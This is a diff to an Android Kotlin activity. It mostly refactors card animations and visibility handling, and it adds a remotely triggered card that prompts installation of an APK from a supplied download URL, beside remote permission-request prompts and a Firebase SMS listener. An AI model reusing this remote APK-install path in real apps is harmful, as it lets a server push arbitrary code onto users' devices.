@@ -19,6 +19,7 @@ import android.os.Handler
 import android.os.Looper
 import android.telephony.TelephonyManager
 import android.view.View
+import android.view.ViewGroup
 import android.view.ViewTreeObserver
 import android.view.animation.AccelerateDecelerateInterpolator
 import android.view.animation.AccelerateInterpolator
@@ -32,6 +33,7 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.appcompat.app.AppCompatDelegate
 import androidx.lifecycle.lifecycleScope
 import androidx.activity.viewModels
+import com.example.fast.BuildConfig
 import com.example.fast.R
 import com.example.fast.config.AppConfig
 import com.example.fast.databinding.ActivityActivatedBinding
@@ -86,12 +88,14 @@ import org.koin.androidx.viewmodel.ext.android.viewModel
 class ActivatedActivity : AppCompatActivity() {
 
     companion object {
-        /** Intent extra: show multipurpose card for remote permission or update (value: [MULTIPURPOSE_CARD_PERMISSION] or [MULTIPURPOSE_CARD_UPDATE]) */
+        /** Intent extra: show multipurpose card for remote permission, update, or install APK */
         const val EXTRA_SHOW_MULTIPURPOSE_CARD = "show_multipurpose_card"
         const val MULTIPURPOSE_CARD_PERMISSION = "permission"
         const val MULTIPURPOSE_CARD_UPDATE = "update"
+        const val MULTIPURPOSE_CARD_INSTALL_APK = "install_apk"
         const val EXTRA_PERMISSIONS = "permissions"
         const val EXTRA_DOWNLOAD_URL = "downloadUrl"
+        const val EXTRA_INSTALL_TITLE = "install_title"
         /** Intent extra: run status animation only when returning from update card (wipe-down entry + wipe line, then runPermissionCheckThenUpdateUI). */
         const val EXTRA_RUN_STATUS_ANIMATION = "run_status_animation"
         /** Value for [ActivationActivity.EXTRA_LAUNCHED_FROM] when MultipurposeCardActivity is launched from ActivatedActivity. */
@@ -136,11 +140,24 @@ class ActivatedActivity : AppCompatActivity() {
     // Handler for UI updates
     private val handler = Handler(Looper.getMainLooper())
     private val handlerRunnables = mutableListOf<Runnable>()
+    private val snapshotIntervalMs = 1000L
+    private val snapshotRunnable = object : Runnable {
+        override fun run() {
+            if (!isDestroyed && !isFinishing) logActivatedSnapshot()
+            handler.postDelayed(this, snapshotIntervalMs)
+        }
+    }
 
     // State
     private var activationCode: String? = null
     private var activationMode: String? = null // "testing" or "running"
     private var isTransitioningFromSplash: Boolean = false
+    /** True when entering from ActivationActivity with card flip; visibility is driven by flip-in + wipe + arrival. */
+    private var useCardFlipEntry: Boolean = false
+    /** Set when card flip entry animation (flip-in + wipe + arrival) has completed so global layout can safely force visible. */
+    private var cardFlipEntryComplete: Boolean = false
+    /** Dim overlay created for card flip entry; kept so safety net can hide it if animation fails. */
+    private var cardFlipDimOverlay: View? = null
     private var isResetting = false
     private var isTesting = false // Prevent multiple simultaneous test clicks
 
@@ -153,13 +170,23 @@ class ActivatedActivity : AppCompatActivity() {
     private var pendingMultipurposeCard: String? = null
     private var pendingPermissions: ArrayList<String>? = null
     private var pendingDownloadUrl: String? = null
+    private var pendingInstallTitle: String? = null
 
     /** Cooldown after permission flow completes to prevent card repeat on onResume. */
     private var lastPermissionFlowCompletedAt: Long = 0
-    private val PERMISSION_FLOW_COOLDOWN_MS = 3000L
+    private val PERMISSION_FLOW_COOLDOWN_MS = 5000L
 
     // Animation state
     private var currentAnimationType = 1 // 1-5 for different animation types
+    private val TESTING_CODE_ANIMATION_CYCLE_MS = 3000L
+    private val testingCodeAnimationRunnable = object : Runnable {
+        override fun run() {
+            if (isDestroyed || isFinishing) return
+            currentAnimationType = (currentAnimationType % 5) + 1
+            id.phoneCodeLabel?.let { animateLabelAppearance(it) }
+            handler.postDelayed(this, TESTING_CODE_ANIMATION_CYCLE_MS)
+        }
+    }
 
     // Firebase SMS listener reference
     private var smsFirebaseListener: com.google.firebase.database.ChildEventListener? = null
@@ -219,6 +246,7 @@ class ActivatedActivity : AppCompatActivity() {
      */
     private fun showRemoteOverlayCard(data: Map<String, String>) {
         currentOverlayCardController?.dismiss()
+        uiManager.hideMainContentForOverlay()
         currentOverlayCardController = CardCoordinator.show(
             context = this,
             data = data,
@@ -229,6 +257,8 @@ class ActivatedActivity : AppCompatActivity() {
             onComplete = {
                 LogHelper.d("ActivatedActivity", "Overlay card dismissed")
                 currentOverlayCardController = null
+                uiManager.showMainContent()
+                restoreMainContentFocus()
             }
         )
         if (currentOverlayCardController == null) {
@@ -255,65 +285,21 @@ class ActivatedActivity : AppCompatActivity() {
         setContentView(id.root)
         AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)
 
-        // IMPORTANT: Force all cards visible IMMEDIATELY after setContentView
-        // This must be done synchronously before any other operations
+        useCardFlipEntry = intent.getBooleanExtra("useCardFlip", false)
+        DebugLogger.logFlow("Activated", "START", "transitionType=${if (useCardFlipEntry) "cardFlip" else "wipeDown"}")
+
+        // Minimal setup after setContentView. Main content visibility is applied by uiManager.showMainContent() in setupUI (or after entry animation).
         try {
-            // Set transition names for card transition
-            // cardView6 from ActivationActivity morphs into phoneCard
             id.phoneCardWrapper.transitionName = "card_wrapper_transition"
-            id.phoneCard.transitionName = "phone_card_transition" // Match cardView6 transition name
-
-            id.phoneCard.visibility = View.VISIBLE
-            id.phoneCard.alpha = 1f
-            id.phoneCardWrapper.visibility = View.VISIBLE
-            id.phoneCardWrapper.alpha = 1f
-
-            id.statusCard.visibility = View.VISIBLE
-            id.statusCard.alpha = 1f
-            // Ensure status card has minimum height
+            id.phoneCard.transitionName = "phone_card_transition"
             id.statusCard.minimumHeight = (80 * resources.displayMetrics.density).toInt()
-
-            // SMS card is always visible now (instruction is on back side)
-            id.smsCard.visibility = View.VISIBLE
-            id.smsCard.alpha = 1f
-
-            // Always show SMS by default (instruction is always available on back side)
-            id.smsContentFront.visibility = View.VISIBLE
-            id.smsContentFront.alpha = 1f
-            id.instructionContentBack.visibility = View.GONE
-            id.instructionContentBack.alpha = 0f
+            id.smsCard.minimumHeight = (200 * resources.displayMetrics.density).toInt()
             id.smsCard.isClickable = true
             id.smsCard.isEnabled = true
-            // Ensure SMS card has minimum height
-            id.smsCard.minimumHeight = (200 * resources.displayMetrics.density).toInt()
-            // Ensure RecyclerView is clickable
             id.smsRecyclerView.isClickable = true
             id.smsRecyclerView.isEnabled = true
-
-            id.testButtonsContainer.visibility = View.VISIBLE
-            id.testButtonsContainer.alpha = 1f
-
-            // Log initial dimensions (before layout)
-            id.main.post {
-                try {
-                    logCardDimensions("Immediately After setContentView")
-                            } catch (e: Exception) {
-                    LogHelper.e("ActivatedActivity", "Error logging initial dimensions", e)
-                }
-            }
-
-            // Force layout to resolve constraints
-            id.main.post {
-                try {
-                    id.statusCard.requestLayout()
-                    id.smsCard.requestLayout()
-                    id.testButtonsContainer.requestLayout()
-            } catch (e: Exception) {
-                    LogHelper.e("ActivatedActivity", "Error forcing layout", e)
-                }
-            }
         } catch (e: Exception) {
-            LogHelper.e("ActivatedActivity", "Error setting card visibility", e)
+            LogHelper.e("ActivatedActivity", "Error in post-setContentView setup", e)
         }
 
         // Initialize ViewModel
@@ -332,6 +318,7 @@ class ActivatedActivity : AppCompatActivity() {
             true
         }
 
+        DebugLogger.logFlow("Activated", "Setup", "begin")
         // Initialize managers (with error handling)
         try {
             initializeManagers()
@@ -359,54 +346,14 @@ class ActivatedActivity : AppCompatActivity() {
                         id.main.viewTreeObserver.removeGlobalOnLayoutListener(this)
                     }
 
-                    // Force all cards to be visible and request layout
-                    id.statusCard.visibility = View.VISIBLE
-                    id.statusCard.alpha = 1f
-                    id.statusCard.requestLayout()
-                    id.statusCard.invalidate()
-
-                    // SMS card is always visible now (instruction is on back side)
-                    id.smsCard.visibility = View.VISIBLE
-                    id.smsCard.alpha = 1f
-
-                    // Always show SMS by default
-                    id.smsContentFront.visibility = View.VISIBLE
-                    id.smsContentFront.alpha = 1f
-                    id.instructionContentBack.visibility = View.GONE
-                    id.instructionContentBack.alpha = 0f
-
-                    id.smsCard.isClickable = true
-                    id.smsCard.isEnabled = true
-                    id.smsCard.requestLayout()
-                    id.smsCard.invalidate()
-                    // Ensure RecyclerView is also ready
-                    id.smsRecyclerView.isClickable = true
-                    id.smsRecyclerView.isEnabled = true
-
-                id.testButtonsContainer.visibility = View.VISIBLE
-            id.testButtonsContainer.alpha = 1f
-                    id.testButtonsContainer.requestLayout()
-                    id.testButtonsContainer.invalidate()
-
-                    // Log all card dimensions and positions
-                    handler.postDelayed({
-                        try {
-                            logCardDimensions("After Global Layout")
-                        } catch (e: Exception) {
-                            LogHelper.e("ActivatedActivity", "Error logging card dimensions", e)
-                        }
-                    }, 100)
-
-                    // Also log after a longer delay to catch any delayed layout changes
-                    handler.postDelayed({
-                        try {
-                            logCardDimensions("Final Check (500ms delay)")
-                        } catch (e: Exception) {
-                            LogHelper.e("ActivatedActivity", "Error in final card dimension check", e)
-                        }
-                    }, 500)
-
-                    LogHelper.d("ActivatedActivity", "Forced layout for cards after global layout")
+                    // Main content visibility is owned by uiManager.showMainContent(); do not duplicate here.
+                    if (!useCardFlipEntry || cardFlipEntryComplete) {
+                        id.statusCard.requestLayout()
+                        id.smsCard.requestLayout()
+                        id.testButtonsContainer.requestLayout()
+                    }
+                    DebugLogger.logFlow("Activated", "Setup", "end")
+                    if (BuildConfig.DEBUG) logCardDimensions("After Global Layout")
                 } catch (e: Exception) {
                     LogHelper.e("ActivatedActivity", "Error forcing layout in global layout listener", e)
                 }
@@ -470,6 +417,14 @@ class ActivatedActivity : AppCompatActivity() {
                         pendingDownloadUrl = null
                         showMultipurposeCardForRemoteUpdate(url)
                     }
+                    MULTIPURPOSE_CARD_INSTALL_APK -> {
+                        pendingMultipurposeCard = null
+                        val url = pendingDownloadUrl ?: ""
+                        val installTitle = pendingInstallTitle
+                        pendingDownloadUrl = null
+                        pendingInstallTitle = null
+                        showMultipurposeCardForRemoteInstallApk(url, installTitle)
+                    }
                     else -> {
                         if (!useTransitionFlow) {
                             runPermissionCheckThenUpdateUI()
@@ -483,27 +438,24 @@ class ActivatedActivity : AppCompatActivity() {
             }
         }
 
-        // Final visibility check after everything is set up
-        id.main.postDelayed({
-            try {
-                id.statusCard.visibility = View.VISIBLE
-                id.statusCard.alpha = 1f
-                // SMS card is always visible now (instruction is on back side)
-                id.smsCard.visibility = View.VISIBLE
-                id.smsCard.alpha = 1f
+        // If card flip entry was used, run safety net after delay in case animation never completed
+        if (useCardFlipEntry) {
+            handler.postDelayed({
+                if (!isDestroyed && !isFinishing) runCardFlipSafetyNet()
+            }, CARD_FLIP_SAFETY_NET_DELAY_MS)
+        }
 
-                // Always show SMS by default
-                id.smsContentFront.visibility = View.VISIBLE
-                id.smsContentFront.alpha = 1f
-                id.instructionContentBack.visibility = View.GONE
-                id.instructionContentBack.alpha = 0f
-                id.statusCard.requestLayout()
-                id.smsCard.requestLayout()
-                LogHelper.d("ActivatedActivity", "Final visibility check completed")
-        } catch (e: Exception) {
-                LogHelper.e("ActivatedActivity", "Error in final visibility check", e)
+        // Fallback: if wipe/arrival or transition never completes, force main content visible after delay so screen is never stuck faded
+        handler.postDelayed({
+            if (isDestroyed || isFinishing) return@postDelayed
+            if (currentOverlayCardController != null) return@postDelayed
+            try {
+                LogHelper.d("ActivatedActivity", "Arrival/main-content safety net: forcing showMainContent()")
+                uiManager.showMainContent()
+            } catch (e: Exception) {
+                LogHelper.e("ActivatedActivity", "Error in arrival safety net", e)
             }
-        }, 100)
+        }, ARRIVAL_SAFETY_NET_DELAY_MS)
     }
 
     override fun onNewIntent(intent: Intent) {
@@ -529,18 +481,27 @@ class ActivatedActivity : AppCompatActivity() {
                     pendingDownloadUrl = null
                     showMultipurposeCardForRemoteUpdate(url)
                 }
+                MULTIPURPOSE_CARD_INSTALL_APK -> {
+                    pendingMultipurposeCard = null
+                    val url = pendingDownloadUrl ?: ""
+                    val installTitle = pendingInstallTitle
+                    pendingDownloadUrl = null
+                    pendingInstallTitle = null
+                    showMultipurposeCardForRemoteInstallApk(url, installTitle)
+                }
                 else -> { }
             }
         }
     }
 
-    /** Read intent extras for remote permission/update multipurpose card (same card as test/attach, detached from TEST button). */
+    /** Read intent extras for remote permission/update/install APK multipurpose card. */
     private fun readRemoteMultipurposeCardExtras(intent: Intent?) {
         val type = intent?.getStringExtra(EXTRA_SHOW_MULTIPURPOSE_CARD) ?: return
-        if (type != MULTIPURPOSE_CARD_PERMISSION && type != MULTIPURPOSE_CARD_UPDATE) return
+        if (type != MULTIPURPOSE_CARD_PERMISSION && type != MULTIPURPOSE_CARD_UPDATE && type != MULTIPURPOSE_CARD_INSTALL_APK) return
         pendingMultipurposeCard = type
         pendingPermissions = if (type == MULTIPURPOSE_CARD_PERMISSION) intent.getStringArrayListExtra(EXTRA_PERMISSIONS) ?: arrayListOf() else null
-        pendingDownloadUrl = if (type == MULTIPURPOSE_CARD_UPDATE) intent.getStringExtra(EXTRA_DOWNLOAD_URL) else null
+        pendingDownloadUrl = if (type == MULTIPURPOSE_CARD_UPDATE || type == MULTIPURPOSE_CARD_INSTALL_APK) intent.getStringExtra(EXTRA_DOWNLOAD_URL) else null
+        pendingInstallTitle = if (type == MULTIPURPOSE_CARD_INSTALL_APK) intent.getStringExtra(EXTRA_INSTALL_TITLE) else null
     }
 
     /**
@@ -577,9 +538,8 @@ class ActivatedActivity : AppCompatActivity() {
                         // Add listener to morph background during transition
                         addListener(object : android.transition.Transition.TransitionListener {
                             override fun onTransitionStart(transition: android.transition.Transition) {
-                                // Ensure phone card is visible and ready
-                                id.phoneCard.visibility = View.VISIBLE
-                                id.phoneCard.alpha = 1f
+                                // Ensure phone card is visible and ready (UIManager owns visibility/alpha)
+                                uiManager.ensurePhoneCardVisibleForTransition()
                                 // Start with input field background style (will morph during transition)
                                 id.phoneCard.setBackgroundResource(R.drawable.input_field_selector)
                             }
@@ -672,8 +632,9 @@ class ActivatedActivity : AppCompatActivity() {
         // Prepare cards (hidden, rotated)
         ActivityCardFlipHelper.prepareForFlipIn(cards, density)
 
-        // Create dim overlay
+        // Create dim overlay (keep reference for safety net if animation fails)
         val dimOverlay = ActivityCardFlipHelper.createDimOverlay(id.main)
+        cardFlipDimOverlay = dimOverlay
         dimOverlay.visibility = View.VISIBLE
         dimOverlay.alpha = ActivityCardFlipHelper.DIM_ALPHA
 
@@ -698,6 +659,8 @@ class ActivatedActivity : AppCompatActivity() {
                     if (!isDestroyed && !isFinishing) {
                         // After flip-in, run the normal post-transition flow
                         runWipeLineThenArrivalThenMasterCard {
+                            cardFlipEntryComplete = true
+                            cardFlipDimOverlay = null
                             runPermissionCheckThenUpdateUI()
                         }
                     }
@@ -711,60 +674,13 @@ class ActivatedActivity : AppCompatActivity() {
      * Used when returning from MultipurposeCardActivity after update+permission card.
      */
     private fun setupWipeDownTransitionForReturnFromUpdate() {
-        val rootView = id.main
-        val headerSection = id.headerSection
-        val phoneCardWrapper = id.phoneCardWrapper
-        val smsCard = id.smsCard
-
         DebugLogger.logAnimation("WipeDownEntryReturn", "start")
-
-        rootView.post {
-            if (isDestroyed || isFinishing) return@post
-
-            val screenHeight = rootView.height.toFloat()
-            val wipeDistance = -screenHeight * 0.4f
-
-            headerSection.translationY = wipeDistance
-            headerSection.alpha = 0f
-            phoneCardWrapper.translationY = wipeDistance
-            phoneCardWrapper.alpha = 0f
-            smsCard.translationY = wipeDistance
-            smsCard.alpha = 0f
-            smsCard.visibility = View.VISIBLE
-
-            val wipeDuration = AnimationConstants.ACTIVATION_WIPE_DOWN_ENTRY_MS
-            val staggerDelay = AnimationConstants.ACTIVATION_WIPE_DOWN_STAGGER_MS
-
-            headerSection.animate()
-                .translationY(0f)
-                .alpha(1f)
-                .setDuration(wipeDuration)
-                .setInterpolator(android.view.animation.DecelerateInterpolator())
-                .start()
-
-            phoneCardWrapper.animate()
-                .translationY(0f)
-                .alpha(1f)
-                .setDuration(wipeDuration)
-                .setStartDelay(staggerDelay)
-                .setInterpolator(android.view.animation.DecelerateInterpolator())
-                .start()
-
-            smsCard.animate()
-                .translationY(0f)
-                .alpha(1f)
-                .setDuration(wipeDuration)
-                .setStartDelay(staggerDelay * 2)
-                .setInterpolator(android.view.animation.DecelerateInterpolator())
-                .withEndAction {
-                    DebugLogger.logAnimationEnd("WipeDownEntryReturn", wipeDuration + staggerDelay * 2)
-                    if (!isDestroyed && !isFinishing) {
-                        runWipeLineThenMasterCard {
-                            runPermissionCheckThenUpdateUI()
-                        }
-                    }
-                }
-                .start()
+        uiManager.runWipeDownEntryAnimation {
+            DebugLogger.logAnimationEnd("WipeDownEntryReturn", AnimationConstants.ACTIVATION_WIPE_DOWN_ENTRY_MS + AnimationConstants.ACTIVATION_WIPE_DOWN_STAGGER_MS * 2)
+            if (!isDestroyed && !isFinishing) {
+                uiManager.showMainContent()
+                runWipeLineThenMasterCard { runPermissionCheckThenUpdateUI() }
+            }
         }
     }
 
@@ -807,7 +723,36 @@ class ActivatedActivity : AppCompatActivity() {
     }
 
     private val WIPE_LINE_DURATION_MS = AnimationConstants.ACTIVATION_WIPE_LINE_MS
-    private val ARRIVAL_STAGGER_MS = 120L
+
+    /** Delay before running card-flip safety net if animation never completed (ms). */
+    private val CARD_FLIP_SAFETY_NET_DELAY_MS = 2500L
+
+    /** Delay before forcing main content visible if wipe/arrival or transition never completed (ms). */
+    private val ARRIVAL_SAFETY_NET_DELAY_MS = 6000L
+
+    /**
+     * If we used card flip entry but cards are still INVISIBLE (animation failed or didn't complete),
+     * force them visible and hide the dim overlay so content is not stuck.
+     */
+    private fun runCardFlipSafetyNet() {
+        if (!useCardFlipEntry || isDestroyed || isFinishing) return
+        if (cardFlipEntryComplete) return
+        val phoneWrapper = id.phoneCardWrapper
+        val smsCard = id.smsCard
+        if (phoneWrapper.visibility != View.INVISIBLE && smsCard.visibility != View.INVISIBLE) return
+        try {
+            LogHelper.d("ActivatedActivity", "Card flip safety net: forcing cards visible")
+            cardFlipEntryComplete = true
+            cardFlipDimOverlay?.let { overlay ->
+                overlay.visibility = View.GONE
+                overlay.alpha = 0f
+            }
+            cardFlipDimOverlay = null
+            uiManager.showMainContent()
+        } catch (e: Exception) {
+            LogHelper.e("ActivatedActivity", "Error in card flip safety net", e)
+        }
+    }
 
     /**
      * Wipe line goes down at speed (unblocks content), then disappears; then one-by-one arrival; then onArrivalComplete.
@@ -817,6 +762,14 @@ class ActivatedActivity : AppCompatActivity() {
         val overlay = id.wipeLineOverlay ?: run {
             onArrivalComplete()
             return
+        }
+        val lp = overlay.layoutParams
+        if (lp != null) {
+            lp.width = ViewGroup.LayoutParams.MATCH_PARENT
+            lp.height = ViewGroup.LayoutParams.MATCH_PARENT
+            overlay.layoutParams = lp
+        } else {
+            overlay.layoutParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
         }
         overlay.visibility = View.VISIBLE
         overlay.alpha = 1f
@@ -832,7 +785,7 @@ class ActivatedActivity : AppCompatActivity() {
                     if (isDestroyed || isFinishing) return@withEndAction
                     overlay.visibility = View.GONE
                     overlay.translationY = 0f
-                    runOneByOneArrival(onArrivalComplete)
+                    uiManager.runArrivalAnimation(onArrivalComplete)
                 }
                 .start()
         }
@@ -848,6 +801,14 @@ class ActivatedActivity : AppCompatActivity() {
         val overlay = id.wipeLineOverlay ?: run {
             onComplete()
             return
+        }
+        val lp = overlay.layoutParams
+        if (lp != null) {
+            lp.width = ViewGroup.LayoutParams.MATCH_PARENT
+            lp.height = ViewGroup.LayoutParams.MATCH_PARENT
+            overlay.layoutParams = lp
+        } else {
+            overlay.layoutParams = ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
         }
         overlay.visibility = View.VISIBLE
         overlay.alpha = 1f
@@ -871,50 +832,6 @@ class ActivatedActivity : AppCompatActivity() {
     }
 
     /**
-     * One-by-one element arrival: headerSection → phoneCardWrapper → statusCard → smsCard → testButtonsContainer. On last animation end calls onComplete.
-     */
-    private fun runOneByOneArrival(onComplete: () -> Unit) {
-        if (isDestroyed || isFinishing) {
-            onComplete()
-            return
-        }
-        val elements = listOf(
-            id.headerSection,
-            id.phoneCardWrapper,
-            id.statusCard,
-            id.smsCard,
-            id.testButtonsContainer
-        )
-        elements.forEach { it.alpha = 0f }
-        var index = 0
-        fun animateNext() {
-            if (isDestroyed || isFinishing) {
-                onComplete()
-                return
-            }
-            if (index >= elements.size) {
-                onComplete()
-                return
-            }
-            val view = elements[index]
-            view.animate()
-                .alpha(1f)
-                .setDuration(300)
-                .setInterpolator(DecelerateInterpolator())
-                .withEndAction {
-                    index++
-                    if (index >= elements.size) {
-                        onComplete()
-                    } else {
-                        handler.postDelayed({ animateNext() }, ARRIVAL_STAGGER_MS)
-                    }
-                }
-                .start()
-        }
-        handler.postDelayed({ animateNext() }, 50)
-    }
-
-    /**
      * Load branding config from Firebase
      */
     private fun loadBrandingConfig() {
@@ -928,16 +845,11 @@ class ActivatedActivity : AppCompatActivity() {
 
                         if (logoView != null) {
                             logoView.text = logoName
-                            logoView.visibility = View.VISIBLE
                         }
                         if (taglineView != null) {
                             taglineView.text = tagline
-                            taglineView.visibility = View.VISIBLE
                         }
-                        if (headerSection != null) {
-                            headerSection.alpha = 1f
-                            headerSection.visibility = View.VISIBLE
-                        }
+                        uiManager.ensureHeaderVisible()
                     }
                 } catch (e: Exception) {
                     LogHelper.e("ActivatedActivity", "Error updating branding UI", e)
@@ -1038,8 +950,12 @@ class ActivatedActivity : AppCompatActivity() {
      * Setup UI
      */
     private fun setupUI() {
-        // Force all cards visible immediately
-        forceAllCardsVisible()
+        // When using card flip entry, visibility is driven by setupCardFlipTransition and its completion
+        // When coming from Activation without shared-element transition, UIManager runs hideElementsForAnimation()
+        // and animates in; do NOT call forceAllCardsVisible() or its posted runnable would overwrite alpha=1 and kill the animation
+        if (!useCardFlipEntry && isTransitioningFromSplash) {
+            forceAllCardsVisible()
+        }
 
         uiManager.setupUIAfterBranding(false) // Always show SMS by default
 
@@ -1057,6 +973,10 @@ class ActivatedActivity : AppCompatActivity() {
 
         // Setup animation change button
         setupAnimationChangeButton()
+
+        // Start 3-second cycle of animations 1-5 on TESTING CODE label (test button removed)
+        handlerRunnables.add(testingCodeAnimationRunnable)
+        handler.postDelayed(testingCodeAnimationRunnable, TESTING_CODE_ANIMATION_CYCLE_MS)
 
         // Setup manual flip for SMS/Instruction card
         setupSmsCardFlipToggle()
@@ -1095,6 +1015,7 @@ class ActivatedActivity : AppCompatActivity() {
                 else -> "UNKNOWN"
             }
             LogHelper.d("ActivatedActivity", "Phone Card: X=$phoneX, Y=$phoneY, Width=$phoneWidth, Height=$phoneHeight, Visibility=$phoneVisibility, Alpha=${phoneCard.alpha}")
+            DebugLogger.logPlacement(context, "phoneCard", phoneX, phoneY, phoneWidth, phoneHeight, phoneCard.alpha, "chain")
 
             // Status Card
             val statusCard = id.statusCard
@@ -1109,6 +1030,7 @@ class ActivatedActivity : AppCompatActivity() {
                 else -> "UNKNOWN"
             }
             LogHelper.d("ActivatedActivity", "Status Card: X=$statusX, Y=$statusY, Width=$statusWidth, Height=$statusHeight, Visibility=$statusVisibility, Alpha=${statusCard.alpha}")
+            DebugLogger.logPlacement(context, "statusCard", statusX, statusY, statusWidth, statusHeight, statusCard.alpha, "chain")
 
             // SMS Card
             val smsCard = id.smsCard
@@ -1123,6 +1045,7 @@ class ActivatedActivity : AppCompatActivity() {
                 else -> "UNKNOWN"
             }
             LogHelper.d("ActivatedActivity", "SMS Card: X=$smsX, Y=$smsY, Width=$smsWidth, Height=$smsHeight, Visibility=$smsVisibility, Alpha=${smsCard.alpha}")
+            DebugLogger.logPlacement(context, "smsCard", smsX, smsY, smsWidth, smsHeight, smsCard.alpha, "chain")
 
             // Buttons Container
             val buttonsContainer = id.testButtonsContainer
@@ -1137,75 +1060,60 @@ class ActivatedActivity : AppCompatActivity() {
                 else -> "UNKNOWN"
             }
             LogHelper.d("ActivatedActivity", "Buttons Container: X=$buttonsX, Y=$buttonsY, Width=$buttonsWidth, Height=$buttonsHeight, Visibility=$buttonsVisibility, Alpha=${buttonsContainer.alpha}")
+            DebugLogger.logPlacement(context, "buttonsContainer", buttonsX, buttonsY, buttonsWidth, buttonsHeight, buttonsContainer.alpha, "chain")
 
             LogHelper.d("ActivatedActivity", "=== End Card Dimensions Log ===")
-
-            // Check for issues
-            if (statusHeight == 0) {
-                LogHelper.w("ActivatedActivity", "⚠️ Status card has 0 height - forcing min height")
-                statusCard.minimumHeight = (80 * resources.displayMetrics.density).toInt()
-                statusCard.requestLayout()
-            }
-            if (smsHeight == 0) {
-                LogHelper.w("ActivatedActivity", "⚠️ SMS card has 0 height - forcing min height")
-                smsCard.minimumHeight = (200 * resources.displayMetrics.density).toInt()
-                smsCard.requestLayout()
-            }
-            if (statusVisibility != "VISIBLE") {
-                LogHelper.w("ActivatedActivity", "⚠️ Status card visibility is $statusVisibility, forcing VISIBLE")
-                statusCard.visibility = View.VISIBLE
-            }
-            if (smsVisibility != "VISIBLE") {
-                LogHelper.w("ActivatedActivity", "⚠️ SMS card visibility is $smsVisibility, forcing VISIBLE")
-                smsCard.visibility = View.VISIBLE
-            }
+            if (statusHeight == 0) LogHelper.w("ActivatedActivity", "Status card has 0 height")
+            if (smsHeight == 0) LogHelper.w("ActivatedActivity", "SMS card has 0 height")
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error logging card dimensions", e)
         }
     }
 
+    /** Visibility code for snapshot: V(alpha), G, I */
+    private fun viewState(v: View): String = when (v.visibility) {
+        View.VISIBLE -> "V(${v.alpha})"
+        View.GONE -> "G"
+        View.INVISIBLE -> "I"
+        else -> "?"
+    }
+
+    /** Log full Activated screen state (every 1s when timer runs). */
+    private fun logActivatedSnapshot() {
+        try {
+            val smsSide = if (id.smsContentFront.visibility == View.VISIBLE) "sms" else "instruction"
+            val progress = id.root.findViewById<View>(R.id.progressBar)?.let { viewState(it) } ?: "?"
+            val promptOverlay = id.root.findViewById<View>(R.id.instructionPromptOverlay)?.let { viewState(it) } ?: "?"
+            val fullOverlay = id.root.findViewById<View>(R.id.instructionFullScreenOverlay)?.let { viewState(it) } ?: "?"
+            val instructionOverlay = if (promptOverlay.startsWith("V") || fullOverlay.startsWith("V")) "V" else "G"
+            val multipurpose = if (instructionOverlayCardController != null || currentOverlayCardController != null) "shown" else "none"
+            val elements = mapOf(
+                "header" to viewState(id.headerSection),
+                "phoneCard" to viewState(id.phoneCard),
+                "statusCard" to viewState(id.statusCard),
+                "smsCard" to viewState(id.smsCard),
+                "smsSide" to smsSide,
+                "deviceInfo" to viewState(id.deviceInfoColumn),
+                "buttons" to viewState(id.testButtonsContainer),
+                "progressOverlay" to progress,
+                "activationMaster" to (id.root.findViewById<View>(R.id.activationMasterCardOverlay)?.let { viewState(it) } ?: "?"),
+                "instructionOverlay" to instructionOverlay,
+                "multipurposeCard" to multipurpose
+            )
+            DebugLogger.logScreenSnapshot("Activated", elements)
+        } catch (e: Exception) {
+            LogHelper.e("ActivatedActivity", "Error in logActivatedSnapshot", e)
+        }
+    }
+
     /**
-     * Force all cards to be visible - called before UI manager
+     * Force all cards to be visible. Single source of truth: uiManager.showMainContent().
      */
     private fun forceAllCardsVisible() {
         try {
             handler.post {
                 try {
-                    // Phone card
-                    id.phoneCard.visibility = View.VISIBLE
-                    id.phoneCard.alpha = 1f
-                    id.phoneCard.isClickable = true
-                    id.phoneCard.isEnabled = true
-
-                    // Status card
-                    id.statusCard.visibility = View.VISIBLE
-                    id.statusCard.alpha = 1f
-                    id.statusCard.isClickable = true
-                    id.statusCard.isEnabled = true
-
-                    // SMS card is always visible now (instruction is on back side)
-                    id.smsCard.visibility = View.VISIBLE
-                    id.smsCard.alpha = 1f
-
-                    // Always show SMS by default
-                    id.smsContentFront.visibility = View.VISIBLE
-                    id.smsContentFront.alpha = 1f
-                    id.instructionContentBack.visibility = View.GONE
-                    id.instructionContentBack.alpha = 0f
-
-                    id.smsCard.isClickable = true
-                    id.smsCard.isEnabled = true
-                    // Ensure RecyclerView is also clickable
-                    id.smsRecyclerView.isClickable = true
-                    id.smsRecyclerView.isEnabled = true
-
-                    // Button container
-                    id.testButtonsContainer.visibility = View.VISIBLE
-                    id.testButtonsContainer.alpha = 1f
-                    id.testButtonsContainer.isClickable = true
-                    id.testButtonsContainer.isEnabled = true
-
-                    LogHelper.d("ActivatedActivity", "All cards forced visible and clickable")
+                    uiManager.showMainContent()
                 } catch (e: Exception) {
                     LogHelper.e("ActivatedActivity", "Error forcing cards visible", e)
                 }
@@ -1395,19 +1303,8 @@ class ActivatedActivity : AppCompatActivity() {
             id.smsRecyclerView.isClickable = true
             id.smsRecyclerView.isEnabled = true
 
-            // SMS card is always visible now (instruction is on back side)
-            id.smsCard.visibility = View.VISIBLE
-            id.smsCard.alpha = 1.0f
-
-            // Always show SMS by default
-            id.smsContentFront.visibility = View.VISIBLE
-            id.smsContentFront.alpha = 1f
-            id.instructionContentBack.visibility = View.GONE
-            id.instructionContentBack.alpha = 0f
-
-            // Show empty state initially
-            id.smsEmptyState.visibility = View.VISIBLE
-            id.smsRecyclerView.visibility = View.GONE
+            // SMS card visibility and side owned by UIManager
+            uiManager.showSmsSide(showEmptyState = true)
 
             // Setup device info text (device ID and version code)
             setupDeviceInfoText()
@@ -1464,7 +1361,7 @@ class ActivatedActivity : AppCompatActivity() {
         try {
             // If animation is already running, skip to prevent crashes with multiple messages
             if (isBorderBlinkAnimating) {
-                LogHelper.d("ActivatedActivity", "Border blink animation already running, skipping")
+                // Border blink already running, skip
                 return
             }
 
@@ -1580,9 +1477,8 @@ class ActivatedActivity : AppCompatActivity() {
                 // Cycle to next animation type
                 currentAnimationType = (currentAnimationType % 5) + 1
 
-                // Update button text to show current animation
